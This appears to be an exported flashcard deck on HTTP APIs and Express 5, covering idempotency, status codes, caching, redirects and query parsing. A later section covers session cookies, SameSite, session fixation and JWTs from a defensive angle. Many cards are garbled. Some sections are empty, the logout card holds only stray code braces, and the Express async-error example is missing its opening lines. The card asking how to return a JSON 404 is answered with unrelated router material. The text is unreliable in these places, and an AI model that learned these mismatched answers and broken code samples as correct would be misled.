cards.front: Which HTTP methods are idempotent, and why does that decide whether a client may automatically retry a request that timed out?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

GET, HEAD, OPTIONS, PUT and DELETE are idempotent: sending the same request twice leaves the server in the same state as sending it once. POST and PATCH are not guaranteed to be. After a timeout the client cannot tell whether the first attempt reached the server, so an automatic retry is only safe when a repeat can do no extra harm: `PUT /tasks/7` with the same body sets the same values again, while a repeated `POST /tasks` can create a second task.

## A worked example

```js
// base = a local node:http server; counter 1 starts at 0
await fetch(`${base}/counters/1`, { method: 'PUT', body: '5' });
await fetch(`${base}/counters/1`, { method: 'PUT', body: '5' });
console.log(await (await fetch(`${base}/counters/1`)).text()); // 5
await fetch(`${base}/counters/1/increment`, { method: 'POST' });
await fetch(`${base}/counters/1/increment`, { method: 'POST' });
console.log(await (await fetch(`${base}/counters/1`)).text()); // 7
```
Repeating the PUT changes nothing; repeating the POST adds again. A retry helper that repeats every failed call would silently double the increment.

## Picture it another way

PUT is like typing 21 into a thermostat: press Set twice and it is still 21. A POST increment is like pressing the +1 button: two presses give +2. When you cannot tell whether the first press registered, only the "set to 21" button is safe to press again.

## A common mistake

Thinking idempotent means "returns the same response". The first `DELETE /tasks/7` returns 204 and a repeat returns 404, yet DELETE is still idempotent because the task is gone either way. The promise is also only as good as your handler: a PUT handler that appends to a history table or bumps a counter breaks it.

## Try a small exercise

A request `PATCH /carts/9` with body `{"op":"add","sku":"A1","qty":1}` times out. Should the client retry it automatically, and why?

<!-- recall:solution -->

**No, not blindly.** This PATCH adds one item every time it runs, so if the first attempt reached the server, a retry puts two in the cart. Instead, reload the cart and let the user decide, send an idempotency key the server remembers, or change the contract to a PUT-style `{"sku":"A1","qty":1}` that sets the quantity.

cards.front: A `POST /tasks` handler has saved a new task. What status, header and body should the response usually have, and what does each give the client?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Return **201 Created**, a **Location** header with the new task's URL (`/tasks/42`), and usually the created task as JSON. 201 says "something new now exists", which 200 does not; Location tells the client where to GET, PUT or DELETE it; the body carries server-assigned fields such as `id` and `createdAt` without a second request. A bare 200 with no id forces the client to reload the whole list to find its new row.

## A worked example

```js
// inside a node:http request handler for POST /tasks
const task = { id: nextId++, title: data.title, done: false };
tasks.set(task.id, task);
res.writeHead(201, {
  'Content-Type': 'application/json',
  Location: `/tasks/${task.id}`,
});
res.end(JSON.stringify(task));
// client: r.status, r.headers.get('location') -> 201 /tasks/1
```
The client reads the header with `headers.get('location')`. For a cross-origin API, the server must also list it in `Access-Control-Expose-Headers`, because Location is not one of the response headers CORS exposes by default.

## Picture it another way

A coat check: 201 is the attendant saying "taken", Location is the numbered ticket you use to get the coat back, and the body is the receipt describing what you handed over.

## A common mistake

Expecting fetch to follow Location after a 201. Browsers and fetch follow Location automatically only on 3xx redirects; on a 201 it is information for your code. Read it yourself, or read the id from the returned body.

## Try a small exercise

After `POST /notes` returns 201 with `Location: /notes/42` and an empty body, does fetch automatically request /notes/42, and how does the client get the new note's id?

<!-- recall:solution -->

**No — fetch follows Location only for 3xx redirects.** The promise resolves with the 201 response itself (`res.redirected` is false). Read `res.headers.get('location')`, which gives `/notes/42`, and take the id from it — or have the API return the created note in the body so the id and server-set fields arrive in the same response.

cards.front: A create-user request is rejected. When is 422 Unprocessable Content the better status, and when is 409 Conflict?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Use **422** when the request is invalid whatever is stored: the JSON parses, but `email` is blank or `age` is -3. Sending the same body again will always fail. Use **409** when the request is fine on its own but clashes with the current state of the resource, such as an email that is already registered. It could succeed after that state changes. Use 400 when the body cannot be parsed at all. Many APIs use 400 for validation too; pick one convention and document it.

## A worked example

```js
// inside POST /users on a node:http server
let data;
try { data = JSON.parse(body); } catch { return send(res, 400, { error: 'Invalid JSON' }); }
if (!data.email?.trim()) return send(res, 422, { errors: { email: 'Required' } });
if (users.has(data.email)) return send(res, 409, { error: 'Email already registered' });
users.set(data.email, data);
return send(res, 201, data);
// {"email": }          -> 400
// {"email":""}         -> 422
// {"email":"a@x.io"}   -> 201, then the same body again -> 409
```
Only the 409 case depends on what is already stored.

## Picture it another way

422 is a form handed back because the date-of-birth box says "banana": fix the form. 409 is a correctly filled booking for a room someone else took a minute ago: the form is fine, the world changed.

## A common mistake

Letting a unique-constraint violation become a 500. The insert fails in a predictable way when the email already exists, so catch that specific database error (in PostgreSQL, SQLSTATE `23505` unique_violation) and return 409 with a message the form can show, instead of reporting a server crash.

## Try a small exercise

Which status — 400, 409 or 422 — fits each `PUT /projects/5` body: (a) `{"name": }` (b) `{"dueDate":"2026-02-30"}` (c) a name another project already uses, when names must be unique?

<!-- recall:solution -->

**(a) 400, (b) 422, (c) 409.** (a) is not valid JSON, so the server cannot even parse it. (b) parses, but 30 February does not exist, so it is invalid whatever is stored. (c) is a valid request that would succeed if the other project did not exist: it conflicts with the current state.

cards.front: Why does `fetch('/tasks', { method: 'POST', body: JSON.stringify(task) })` with no headers option often reach the server with an empty or rejected body?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

With a string body and no Content-Type, fetch sends `Content-Type: text/plain;charset=UTF-8`. Servers choose a body parser by that header: Express 5's `express.json()` only parses JSON types, so `req.body` stays `undefined`, and a strict API answers **415 Unsupported Media Type**. Add `headers: { 'Content-Type': 'application/json' }`. Content-Type describes the body you send; `Accept` asks for the format you want back.

## A worked example

```js
// /echo-ct on a node:http server replies with the Content-Type it received
const post = (body, headers) => fetch(`${base}/echo-ct`, { method: 'POST', body, headers }).then(r => r.text());
console.log(await post(JSON.stringify({ title: 'A' })));
// text/plain;charset=UTF-8
console.log(await post(JSON.stringify({ title: 'A' }), { 'Content-Type': 'application/json' }));
// application/json
console.log(await post(new URLSearchParams({ title: 'A' })));
// application/x-www-form-urlencoded;charset=UTF-8
```
fetch picks a default type from the body object. A JSON string is just a string to it.

## Picture it another way

A shipping label: the warehouse routes parcels by the label without opening them. Glassware labelled "books" goes to the wrong shelf even though the contents are fine.

## A common mistake

Checking the header with `===`. Real clients send parameters, such as `application/json; charset=utf-8`, so an exact comparison rejects valid JSON with 415. Compare only the part before `;`, lowercased, or use your framework's type check (`express.json()` already does this).

## Try a small exercise

Your API returns 415 for `curl -X POST localhost:3000/tasks -d '{"title":"A"}'`, but the browser app works. What Content-Type is curl sending, and how do you fix the command?

<!-- recall:solution -->

**`application/x-www-form-urlencoded`.** curl labels `-d` data as form data unless told otherwise, so the JSON-only endpoint rightly refuses it. Add `-H 'Content-Type: application/json'`, or use `--json '{"title":"A"}'` (curl 7.82 or later), which sets Content-Type and Accept to `application/json` and sends a POST.

cards.front: What is the difference between `Cache-Control: max-age=60`, `no-cache` and `no-store` on an HTTP response?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

`max-age=60`: a cache may reuse the stored response for 60 seconds without contacting the server. `no-cache`: it may store the response but must revalidate with the server before every reuse, usually getting a small 304 if nothing changed — the name is misleading. `no-store`: do not keep a copy at all. Add `private` to per-user responses so shared caches such as CDNs never store them.

## A worked example

```js
// node:http: one policy per kind of response
if (url.pathname === '/assets/app.3f9a1c.js') {
  // the file name changes on every build, so it can be kept for a year
  res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
} else if (url.pathname === '/api/tasks') {
  res.setHeader('Cache-Control', 'private, no-cache'); // keep, but check first
  res.setHeader('ETag', etagFor(tasks));
} else if (url.pathname === '/api/me/payment-methods') {
  res.setHeader('Cache-Control', 'no-store'); // never keep a copy
}
```
`curl -i` shows the header each route really sends.

## Picture it another way

`max-age=60` is milk with a use-by date: drink it without asking until then. `no-cache` is leftovers you may keep but must check before eating. `no-store` means it never goes in the fridge.

## A common mistake

Using `no-cache` to mean "never cache". It still allows storing, so for bank details or tokens use `no-store`. The opposite slip: a long `max-age` on `/api/tasks` hides edits until the time runs out, because the browser does not ask the server again while the copy is fresh.

## Try a small exercise

A hashed bundle `app.3f9a1c.js` and `index.html` both get `Cache-Control: max-age=31536000`. After a deploy, users still run the old app. Which Cache-Control should `index.html` get instead?

<!-- recall:solution -->

**`Cache-Control: no-cache`, with an ETag or Last-Modified.** `index.html` must be checked on every load so it can point at the new hashed file names; when nothing changed, the check costs a small 304. Hashed files can keep the year-long `max-age` (plus `immutable`) because each build gives changed files new names.

cards.front: How do `ETag`, `If-None-Match` and `304 Not Modified` let a client reuse a cached GET response without downloading the body again?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

The server labels each version of a response: `ETag: "5258dddf"`. To check a stored copy, the client repeats the GET with `If-None-Match: "5258dddf"`. If the resource still has that tag, the server replies **304 Not Modified** with headers and no body, and the client reuses its copy; otherwise it sends 200 with the new body and a new ETag. Browsers do this automatically for their HTTP cache — the server's job is to compute the tag and compare it.

## A worked example

```bash
$ curl -i localhost:3000/tasks/1
HTTP/1.1 200 OK
Content-Type: application/json
ETag: "5258dddf"
Cache-Control: private, no-cache

{"id":1,"title":"A","done":false}
$ curl -i localhost:3000/tasks/1 -H 'If-None-Match: "5258dddf"'
HTTP/1.1 304 Not Modified
ETag: "5258dddf"
Cache-Control: private, no-cache
```
Output trimmed to the relevant headers. The tag here is the first 8 hex characters of a SHA-1 of the task JSON; any value that changes whenever the content changes will do.

## Picture it another way

Asking a librarian "has timetable version 7 changed?" A "no" costs one word; only a "yes" needs a fresh printout.

## A common mistake

Comparing the header to the tag with `===`. `If-None-Match` can hold several tags (`"a", "b"`), `*`, or weak tags like `W/"a"`, which compression layers often produce, and it matches weakly. Also remember that if the handler does all its database work before comparing, a 304 saves bandwidth but not server time.

## Try a small exercise

Predict: a GET returned `ETag: "v3"`. The task is then edited, and its ETag becomes `"v4"`. The client sends `If-None-Match: "v3"`. What status, headers and body come back?

<!-- recall:solution -->

**200 OK with the full new body and `ETag: "v4"`.** The client's tag no longer matches, so its copy is stale; the server sends the fresh representation and the new tag, which the client stores for next time. A 304 comes back only when the current tag matches one listed in If-None-Match.

cards.front: A POST request gets a redirect response. With 301, 302 or 303 versus 307 or 308, what method and body does the browser's follow-up request use?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

**303 See Other** makes the follow-up a GET with no body — what you want after a form save. **307** (temporary) and **308** (permanent) require the client to repeat the same method and body at the new URL, which suits a moved API endpoint. **301** and **302** are older: browsers and fetch turn a redirected POST into a GET and drop the body, which quietly breaks POST endpoints. 301 and 308 are permanent and may be cached; 302, 303 and 307 are temporary.

## A worked example

```js
// /old?code=N answers N with Location: /echo; /echo reports what it received
for (const code of [301, 302, 303, 307, 308]) {
  const r = await fetch(`${base}/old?code=${code}`, { method: 'POST', body: 'title=A' });
  console.log(code, await r.text());
}
// 301 GET ct=- body=""
// 302 GET ct=- body=""
// 303 GET ct=- body=""
// 307 POST ct=text/plain;charset=UTF-8 body="title=A"
// 308 POST ct=text/plain;charset=UTF-8 body="title=A"
```
Run with Node 22's built-in fetch, which follows the same redirect rules as browsers.

303 is a receptionist saying "got your form — now go and read the noticeboard over there": you walk over empty-handed. 307 and 308 say "wrong desk, take the same form to desk 4".

cards.front: A list endpoint reads `?page=2&tag=a&tag=b` with URLSearchParams. What do `get('page')`, `get('limit')` and `get('tag')` return, and how do you get every tag?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Reading gives strings only: `get('page')` returns `'2'`, not 2, and `get('limit')` returns `null` because the parameter is missing. For a repeated key, `get('tag')` returns the first value, `'a'`, and `getAll('tag')` returns `['a', 'b']`. Convert and validate numbers yourself. Build query strings with the same API: `url.searchParams.set('q', text)` encodes `&` as `%26` and a space as `+`, so user text cannot start a new parameter.

## A worked example

```js
const url = new URL('/tasks', 'http://localhost:3000');
url.searchParams.set('status', 'open');
url.searchParams.set('q', 'rock & roll');
console.log(url.href); // http://localhost:3000/tasks?status=open&q=rock+%26+roll

const p = new URL('http://x/tasks?page=2&tag=a&tag=b').searchParams;
console.log(typeof p.get('page')); // string
console.log(p.get('limit'));        // null
console.log(p.get('tag'), p.getAll('tag')); // a [ 'a', 'b' ]
```
Pass `url` straight to fetch. On a node:http server, read `new URL(req.url, 'http://localhost').searchParams` the same way.

Filling in a paper form box by box instead of writing everything on one line: the clerk never mistakes the "&" in "rock & roll" for the start of the next field.

Decoding query values with `decodeURIComponent`. It leaves `+` as a literal plus, so `q=rock+roll` becomes `rock+roll`, while URLSearchParams reads `+` as a space and gives `rock roll`. Read and write query strings with the same tool.

cards.front: When you test an API from the terminal, what does `curl -i` show, what does `curl -v` add, and why is plain `curl URL` not enough?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Plain `curl URL` prints only the response body, so a 404 error page or an empty 204 hides what happened. `-i` adds the status line and response headers above the body: status, Content-Type, Location, Cache-Control, ETag. `-v` (verbose) also shows the request curl sent, on lines starting with `>`, and the response headers on lines starting with `<`, so you can confirm the method, Content-Type and Authorization that really left your machine.

## A worked example

```bash
$ curl -v -X DELETE localhost:3000/tasks/1
* Connected to localhost (::1) port 3000
> DELETE /tasks/1 HTTP/1.1
> Host: localhost:3000
> User-Agent: curl/8.15.0
> Accept: */*
>
< HTTP/1.1 204 No Content
< Date: Thu, 24 Sep 2026 22:21:09 GMT
< Connection: keep-alive
<
```
Output trimmed. Without `-v` or `-i` this 204 prints nothing at all, and a 404 would print only its body, never the status.

## Picture it another way

Plain curl shows you the letter. `-i` adds the envelope with its postmarks. `-v` also hands you a copy of the letter you sent.

Trusting curl's exit status in scripts. `curl URL && echo ok` prints ok even for a 404 or 500, because curl only fails on network errors by default. In smoke checks use `--fail` (`-f`), which exits with code 22 for HTTP 400 and above, and `-sS` to hide the progress meter but keep error messages.

cards.front: An Express route is `/tasks/:id` and the request is GET /tasks/7. What type is `req.params.id`, and why does `tasks.find(t => t.id === req.params.id)` miss the task whose id is the number 7?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Everything in a URL is text, so `req.params.id` is the string `"7"`. Strict equality (`===`) also compares types, and `7 === "7"` is false, so `find` returns `undefined` and the handler answers 404 for a task that exists. Convert once at the edge with `Number(req.params.id)`, then check `Number.isInteger(id)` and reply 400 if it fails. Query values in `req.query` are strings too.

## A worked example

```js
const tasks = [{ id: 7, title: 'Buy milk' }];

app.get('/tasks/:id', (req, res) => {
  typeof req.params.id;                        // 'string'
  tasks.find(t => t.id === req.params.id);     // undefined
  const id = Number(req.params.id);
  if (!Number.isInteger(id)) {
    return res.status(400).json({ error: 'id must be a whole number' });
  }
  const task = tasks.find(t => t.id === id);   // { id: 7, ... }
  if (!task) return res.status(404).json({ error: 'Task not found' });
  res.json(task);
});
```
In Express 5, GET /tasks/7 hits the string comparison first and finds nothing; the converted `id` finds the task. GET /tasks/abc gets a 400 because `Number('abc')` is `NaN`.

## Picture it another way

A paper order form has a box labelled "Quantity". Even when someone writes 7 in it, the clerk receives handwriting, not a number, and has to read it as a number before doing any arithmetic. A URL is that paper form: the server always receives text and must convert it on purpose.

## A common mistake

Switching to loose equality (`==`) or `parseInt` to make the lookup work. `==` hides the type mix-up everywhere else in the code, and `parseInt('7abc', 10)` quietly returns 7, so junk ids get accepted. Use `Number()`, which gives `NaN` for `'7abc'`, and reject it with a 400.

**`req.query.page` is the array `['2', '3']` and `page` is `NaN`.** A repeated query key becomes an array of strings, and `Number(['2', '3'])` is `NaN`. Check `Number.isInteger(page)` (and a sensible range) and reply 400 with a clear message instead of querying with `NaN`.

cards.front: In an Express 5 app, why can `req.body` be undefined in a POST handler, and what must the server and the client each do for a JSON body to arrive?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Express does not read request bodies on its own. The server must register the built-in parser, `app.use(express.json())`, before its routes; no separate `body-parser` install is needed. The parser only runs when the request says `Content-Type: application/json`, so the client must send that header. If either piece is missing, `req.body` stays `undefined` in Express 5.

## A worked example

```js
// server
const app = express();
app.use(express.json()); // before the routes that read req.body
app.post('/tasks', (req, res) => {
  res.status(201).json({ title: req.body.title });
});

// client
```

cards.front: In Express 5, an async route handler awaits a database call that rejects. What happens to the error, and how did Express 4 behave differently?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Express 5 watches the promise an async handler returns. If it rejects, Express calls `next(err)` for you, so the error reaches your error-handling middleware (or the default handler, which replies 500). Express 4 ignored that promise, so the rejection went unhandled: on Node 22 that crashes the whole server. That is why older code wraps every handler in `try/catch` with `next(err)`. The rescue only covers the returned promise, not work you start without `await`.

## A worked example

```js

  const task = await db.findTask(req.params.id); // rejects: 'db down'
  res.json(task);
});

  console.error(err);              // full details in the server log
  res.status(500).json({ error: 'Something went wrong' });
});
// Express 5: GET /tasks/1 -> 500 {"error":"Something went wrong"}
```

cards.front: What makes an Express function an error handler rather than ordinary middleware, and where in the app must it be registered?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Express treats a function as an error handler only if it declares exactly four parameters: `(err, req, res, next)`. Register it with `app.use` after all routes and other middleware, because errors travel forward through the stack. It receives errors from `next(err)`, thrown errors, and rejected async handlers. Use `err.status` when it exists (body-parser sets 400), otherwise reply 500 with a generic message, and log the details on the server.

## A worked example

```js
app.use(express.json());
app.use('/api/tasks', tasksRouter);

app.use((err, req, res, next) => {
  if (res.headersSent) return next(err); // let Express close it
  console.error(err);
  const status = err.status ?? 500;
  res.status(status).json({
    error: status < 500 ? 'Bad request' : 'Something went wrong',
  });
});
```
A rejected handler gets `500 {"error":"Something went wrong"}`, and malformed JSON from `express.json()` gets `400 {"error":"Bad request"}`.

It is the emergency exit at the end of a corridor. Express only recognises the door by its sign (the four parameters), and it only helps people who are still in front of it, so it must be at the end, not the start.

cards.front: When no Express 5 route matches a request such as GET /api/taks, what does Express send by default, and how do you return a JSON 404 instead?

```js
});

  res.status(500).json({ error: 'Something went wrong' });
});
```

## Plain English

A router is a small set of routes and middleware you mount at a path. Paths inside it are relative to that mount point: `router.get('/:id')` serves GET /api/tasks/:id, and `router.get('/')` serves GET /api/tasks. Inside, `req.baseUrl` is `/api/tasks`. This keeps one feature in one file, and `router.use(requireUser)` protects only that feature.

## A worked example

```js

router.get('/', (req, res) => res.json({ baseUrl: req.baseUrl }));
router.get('/:id', (req, res) => res.json({ id: req.params.id }));
export default router;

// app.js
app.use('/api/tasks', router);
// GET /api/tasks   -> {"baseUrl":"/api/tasks"}
// GET /api/tasks/5 -> {"id":"5"}
// GET /tasks       -> 404
```
The router never mentions `/api/tasks`, so you can move or version it by changing one line in `app.js`.

cards.front: How does `node --env-file=.env server.js` load configuration in Node 22, and what type is every value you read from `process.env`?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Node 22 reads the `KEY=value` lines of the file into `process.env` before your code runs, so a small app needs no `dotenv` package. A variable already set in the shell wins over the file. A missing file stops Node with an error; `--env-file-if-exists` (Node 22.9+) makes it optional. Every value is a string (or `undefined` when absent), so convert and validate numbers and flags at startup. Keep `.env` out of Git.

## A worked example

```bash
$ cat .env
PORT=3000
DATABASE_URL=postgres://localhost/tasks

$ node --env-file=.env -e "console.log(typeof process.env.PORT)"
string
$ node -e "console.log(process.env.DATABASE_URL)"
undefined
$ PORT=8080 node --env-file=.env -e "console.log(process.env.PORT)"
8080
```
Without the flag the file is ignored, and a value already exported in the shell overrides the file.

## Picture it another way

The `.env` file is a sticky note of settings you hand to Node at the door. Node copies it into its notebook, but anything already written in the notebook by the shell stays as it was, and every entry is written as text.

## A common mistake

cards.front: In Express 5, what do `res.status(201).json(task)` and `res.sendStatus(204)` each send, and why does `res.status(404)` on its own leave the client waiting?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

`res.status(code)` only records the status code and returns `res` so you can chain; it sends nothing. `.json(task)` serialises the object, sets `Content-Type: application/json`, and ends the response. `res.sendStatus(code)` sets the code and ends the response too, with the reason phrase as a text body (`Not Found`), or no body for 204. A bare `res.status(404)` never ends, so the request stays pending. Express 5 also throws if the code is not an integer from 100 to 999.

## A worked example

```js
app.post('/tasks', (req, res) => {
  const task = { id: 8, title: req.body.title };
  res.status(201).location('/tasks/8').json(task);
}); // 201, Location: /tasks/8, {"id":8,"title":"Buy milk"}

app.delete('/tasks/:id', (req, res) => {
  res.sendStatus(204);
}); // 204, empty body, no Content-Type

// res.status('201') throws a TypeError in Express 5: codes must be integers
```
Only the calls that end the response (`json`, `send`, `sendStatus`, `end`) actually send anything.

cards.front: An Express POST /tasks handler receives `req.body` from any client. What should it check before saving a task, and what should it send back when the title is invalid?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Treat `req.body` as untrusted: it can be missing, an array, or have the wrong types. Check each field's type first, then normalise (trim) and check limits. On failure, `return` a 400 with a message per field so the form can show it. Build the saved object from the fields you accept, not by spreading `req.body`, so extras like `isAdmin` are ignored. Libraries such as zod do this with less code.

## A worked example

```js
app.post('/tasks', (req, res) => {
  const raw = req.body?.title;
  const title = typeof raw === 'string' ? raw.trim() : '';
  if (!title || title.length > 80) {
    return res.status(400).json({ errors: { title: 'Enter 1-80 characters' } });
  }
  const task = { id: nextId++, title, done: false }; // only allowed fields
  tasks.push(task);
  res.status(201).json(task);
});
```
`{"title":"  Buy milk "}` gives 201 with `"Buy milk"`; `"   "`, `42`, `{}` and `[]` all give 400; `{"title":"x","isAdmin":true}` saves only `title`.

## Picture it another way

A receptionist checking a visitor form reads every box before filing it: is the name actually a name, is it too long, is anything extra scribbled in the margin? Only the boxes on the official form get copied into the records.

Forgetting `return` before `res.status(400).json(…)`. The 400 is sent, but the handler keeps going, saves the invalid task, and then crashes with ERR_HTTP_HEADERS_SENT when it tries to send the 201.

name: 23 · Logins, sessions, and cookies
description: How a web app remembers who is logged in: session IDs, cookie attributes, login and logout, JWTs, OAuth sign-in, and limits on password guessing.

cards.front: After a user logs in with a server-side session, what does the server keep, and what does the browser actually hold?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

The server keeps the facts (which user, when the session started) in a session store, keyed by a long random session ID. The browser holds only that ID, in a cookie set by a `Set-Cookie` response header, and sends it back automatically in the `Cookie` header of later requests. On each request the server looks the ID up to find the user. The ID must be unguessable: OWASP asks for at least 64 bits of randomness from a secure generator such as `crypto.randomBytes`.

## A worked example

```js
import { randomBytes } from 'node:crypto';
const sessions = new Map(); // session ID -> { userId }

app.post('/login', (req, res) => {
  // ...after checking the email and password
  const sid = randomBytes(32).toString('base64url');
  sessions.set(sid, { userId: 42 });
  res.cookie('sid', sid, { httpOnly: true, secure: true, sameSite: 'lax' });
  res.sendStatus(204);
});
```

In Express 5 this sends `Set-Cookie: sid=…; Path=/; HttpOnly; Secure; SameSite=Lax` with a 43-character ID. A later `GET /me` carrying that cookie found `{ userId: 42 }`; a made-up ID got 401.

## Picture it another way

A coat check. Your coat (the user data) stays behind the counter, and you get a numbered ticket (the session ID). The ticket works only because the attendant looks it up. If ticket numbers were easy to guess, anyone could collect your coat, which is why the ID must be long and random.

## A common mistake

Putting the user's identity itself in a plain cookie, such as `userId=42`. Anyone can edit their cookies in DevTools or curl and become user 43. A session cookie should carry only a random ID. Data stored directly in a cookie must at least be signed (and encrypted if private), as a JWT or signed cookie is.

## Try a small exercise

A teammate stores `userId=42` in a plain cookie instead of a random session ID. What can any user do, and what should the cookie hold instead?

<!-- recall:solution -->

**They can sign in as anyone.** Cookies are editable in DevTools or with curl, so changing `userId=42` to `43` makes the server trust a different user. Store only a long random session ID (at least 64 bits of entropy) and keep the user ID in the server-side session record that the ID points to.

cards.front: Which attributes should a login session cookie's Set-Cookie header include, and what does each one limit?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

`HttpOnly` hides the cookie from page JavaScript (`document.cookie`). `Secure` sends it only over HTTPS. `SameSite=Strict` or `Lax` limits sending it when another site starts the request. `Path=/` with no `Domain` keeps it on this exact host, not subdomains. No `Max-Age` or `Expires` makes it a session cookie that ends with the browser session. OWASP also recommends the `__Host-` name prefix, which the browser rejects unless `Secure`, `Path=/`, and no `Domain` are all present.

## A worked example

```http
HTTP/1.1 204 No Content
Set-Cookie: __Host-sid=uko-oDsKAhHU…; Path=/; HttpOnly; Secure; SameSite=Lax
```

Express 5 produced exactly this attribute list from `res.cookie('__Host-sid', sid, { path: '/', httpOnly: true, secure: true, sameSite: 'lax' })`. The DevTools Application panel's cookie list shows each attribute as a column.

## Picture it another way

Treat the attributes as delivery rules the browser enforces for you: Secure means only over an encrypted line, HttpOnly means never handed to page scripts, SameSite means not attached when another site starts the request, and host-only means this exact host. A missing rule doesn't break login; it silently removes a protection, which is why tests still pass.

## A common mistake

Adding `Domain=example.com` "so it works everywhere". Omitting `Domain` already gives a host-only cookie; setting it widens the cookie to every subdomain, so a weaker or compromised `blog.example.com` receives the session ID too. Leave `Domain` off unless sharing across subdomains is a deliberate requirement.

## Try a small exercise

A session cookie set by app.example.com includes `Domain=example.com`. Which hosts receive it, and what changes if Domain is left out?

<!-- recall:solution -->

**example.com and every subdomain receive it**, such as shop.example.com and blog.example.com. Leaving `Domain` out makes a host-only cookie sent only to app.example.com, the narrow scope OWASP recommends for session IDs. The `__Host-` prefix enforces this: the browser rejects a `__Host-` cookie that has a `Domain` attribute.

cards.front: What do SameSite=Strict, Lax, and None change about when the browser attaches a cookie to a request?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

SameSite matters when another site starts the request. `Strict`: never sent cross-site, not even when a user follows a link to you. `Lax`: sent on top-level navigations with safe methods, such as clicking a link (GET), but not on cross-site form POSTs, fetches, or image loads. `None`: sent in all contexts, and must also be `Secure`. Browsers differ when SameSite is missing (Chrome and Edge treat it as Lax; Firefox and Safari currently do not), so OWASP says always set it, preferring Strict.

## A worked example

```text
Request started on another site   Strict  Lax  None
Click a link to you (GET)         no      yes  yes
Submit a form to you (POST)       no      no   yes
fetch or image request to you     no      no   yes
```

The rows follow MDN's and OWASP's descriptions. For `None`, a fetch must also use `credentials: 'include'`, and browsers that block third-party cookies may still withhold it.

## Picture it another way

Ask who pressed the button. If the user is on your own site, all three values send the cookie. If another site's page causes the request, Strict stays silent, Lax speaks only for a plain link-click navigation, and None always speaks. That is why Lax blocks a hidden cross-site form POST but still lets email links arrive signed in.

## A common mistake

Treating SameSite=Lax as complete CSRF protection. OWASP calls it defence in depth: a GET endpoint that changes data can still be triggered by a link click, and sibling subdomains count as the same site. Keep state changes off GET and still use your framework's CSRF protection.

## Try a small exercise

Your session cookie is SameSite=Strict. A signed-in user taps a link to your app inside a webmail page. Why do they see the login screen, and what are the fixes?

<!-- recall:solution -->

**The first request is cross-site, so Strict withholds the cookie** and the server sees an anonymous visitor; the next click inside your site sends it again. Fixes: use `SameSite=Lax` for the session cookie (sent on top-level link navigations), or keep Strict and have the landing page re-check the session with a same-site request before showing login. OWASP prefers Strict but accepts Lax.

cards.front: Why should a server issue a brand-new session ID at the moment a user logs in, instead of keeping the current one?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

To stop session fixation. If the ID stays the same, an attacker who planted or learned the anonymous ID before login (on a shared computer, or via a cookie set from a sibling subdomain) holds a signed-in ID as soon as the victim logs in. A new ID makes the old one worthless. In express-session, call `req.session.regenerate()` after the password check and before storing the user ID. OWASP requires this after any privilege change, not just login.

## A worked example


cards.front: What must a logout endpoint do on the server, and why is deleting the cookie in the browser not enough?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

```js
  });
});
```

cards.front: A login API returns a signed JWT. Can anyone holding it read the claims inside, and what does the signature guarantee?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

Yes, anyone can read it. A signed JWT (JSON Web Token) is three base64url parts, header.payload.signature, and base64url is an encoding, not encryption. The signature, made with a server-side key that clients never see, guarantees integrity: if someone edits a claim such as `role`, verification fails. So keep secrets and private personal data out of the payload, and verify the signature before trusting any claim.

## A worked example

```js
const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzkwMjkwMDI2fQ.xvU6…';
const payload = token.split('.')[1];
console.log(JSON.parse(Buffer.from(payload, 'base64url')));
// { sub: '42', role: 'user', exp: 1790290026 }
```

No key is needed to read it. In the same Node 22 test, swapping in a payload with `role: 'admin'` while keeping the old signature failed HMAC-SHA256 verification.

## Picture it another way

A signed JWT is a postcard with a tamper-evident seal, not a sealed letter. Anyone who handles it can read the message; the seal only proves nobody changed the message since the sender applied it.

Reading "signed" as "private" and putting an email address, a home address, or internal notes in the payload. Browser extensions, logs, and proxies that see the token can read them. Keep claims to IDs and short-lived facts the holder is allowed to see.

Predict: a user base64url-decodes the middle part of their JWT, changes `role` from `user` to `admin`, re-encodes it, and sends it back. What does a correctly written server do?

**It rejects the token.** The signature was computed over the original header and payload, so after the edit the server's HMAC or public-key check no longer matches and the request should get 401. Reading the claims was always possible; changing them undetected is not, unless the server skips verification or accepts `alg: none`.

cards.front: Why can't a server instantly log out a stateless JWT, and how do short expiry times and refresh tokens limit the damage?
cards.back:
<!-- recall:teaching:v1 -->

## Plain English

A stateless JWT is accepted by checking its signature and `exp` claim, with no database lookup, so nothing on the server can say "this one is cancelled". A stolen token works until it expires. The common design: short-lived access tokens (minutes) plus a refresh token that the server stores and checks, so logout or a password change revokes the refresh token and the access token dies soon after. Instant revocation needs server state again, such as a denylist of token IDs (`jti`).

## A worked example

```js
function verifyClaims(claims, now = Math.floor(Date.now() / 1000)) {
  if (typeof claims.exp !== 'number' || claims.exp <= now) return 'expired';
  return claims;
}
const now = Math.floor(Date.now() / 1000); // JWT times are in seconds
console.log(verifyClaims({ sub: '42', exp: now + 15 * 60 })); // { sub: '42', exp: … }
console.log(verifyClaims({ sub: '42', exp: now - 1 }));       // 'expired'
```

After the signature check, this `exp` test is the only built-in end a stateless token has. Libraries such as jose run it for you.

## Picture it another way

